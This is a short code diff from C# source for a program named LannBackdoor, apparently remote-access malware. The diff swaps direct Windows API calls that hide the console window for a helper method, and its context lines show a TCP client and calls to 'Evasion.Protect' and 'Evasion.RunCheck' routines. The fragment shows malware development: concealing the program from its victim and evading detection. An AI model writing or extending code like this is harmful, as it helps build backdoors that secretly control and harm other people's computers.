@@ -17,17 +17,11 @@ public static class LannBackdoor {
     private static TCPClient _tcpClient = null!;
     private static int _serverId;
 
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
     public static async Task Main() {
         Console.OutputEncoding = System.Text.Encoding.UTF8;
 
         if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
-        else ShowWindow(GetConsoleWindow(), 0);
+        else PInvoke.HideWindow();
 
         await Evasion.Protect();
         bool result = await Evasion.RunCheck();
